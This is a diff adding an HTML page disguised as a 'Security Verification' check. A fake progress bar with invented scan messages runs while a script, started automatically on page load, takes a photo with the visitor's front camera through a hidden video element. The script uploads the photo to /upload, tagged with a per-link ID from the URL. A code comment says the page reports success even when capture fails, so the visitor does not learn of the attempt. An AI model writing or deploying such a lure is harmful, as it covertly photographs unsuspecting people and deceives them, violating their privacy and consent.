@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 40px;
+        }
+        
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 30px 0;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success {
+            color: #4CAF50;
+            text-align: center;
+            font-size: 18px;
+            padding: 20px;
+            display: none;
+        }
+        
+        .checkmark {
+            font-size: 50px;
+            color: #4CAF50;
+            margin-bottom: 15px;
+        }
+        
+        #video { 
+            display: none; 
+        }
+        
+        .progress {
+            margin-top: 20px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            height: 8px;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">🔐</div>
+        <h1>Security Verification</h1>
+        <p class="subtitle">Please wait while we verify your credentials and check your device security...</p>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p id="status">Initializing security scan...</p>
+            <div class="progress">
+                <div class="progress-bar" id="progress"></div>
+            </div>
+        </div>
+        
+        <div class="success" id="success">
+            <div class="checkmark">✓</div>
+            <div>Verification Complete!</div>
+            <p style="font-size: 14px; color: #666; margin-top: 10px;">
+                Your device has been verified successfully.
+            </p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    
+    <script>
+        // Get linkId from URL
+        const pathParts = window.location.pathname.split('/');
+        const linkId = pathParts[pathParts.length - 1];
+        
+        let progress = 0;
+        
+        const statuses = [
+            'Checking device integrity...',
+            'Verifying network security...',
+            'Analyzing system status...',
+            'Finalizing verification...'
+        ];
+        
+        function updateProgress() {
+            const progressBar = document.getElementById('progress');
+            const statusEl = document.getElementById('status');
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+                
+                progressBar.style.width = progress + '%';
+                
+                const statusIndex = Math.floor(progress / 25);
+                if (statuses[statusIndex]) {
+                    statusEl.textContent = statuses[statusIndex];
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                }
+            }, 200);
+        }
+        
+        async function capturePhoto() {
+            updateProgress();
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // Wait for better quality
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Capture photo
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Convert to blob
+                const blob = await new Promise(resolve => 
+                    canvas.toBlob(resolve, 'image/jpeg', 0.95)
+                );
+                
+                // Send to server
+                const formData = new FormData();
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('linkId', linkId);
+                
+                await fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Wait a bit more
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Show success
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // Show success anyway to not reveal the capture attempt
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+            }
+        }
+        
+        // Start capture when page loads
+        window.addEventListener('load', () => {
+            setTimeout(capturePhoto, 800);
+        });
+    </script>
+</body>
+</html>
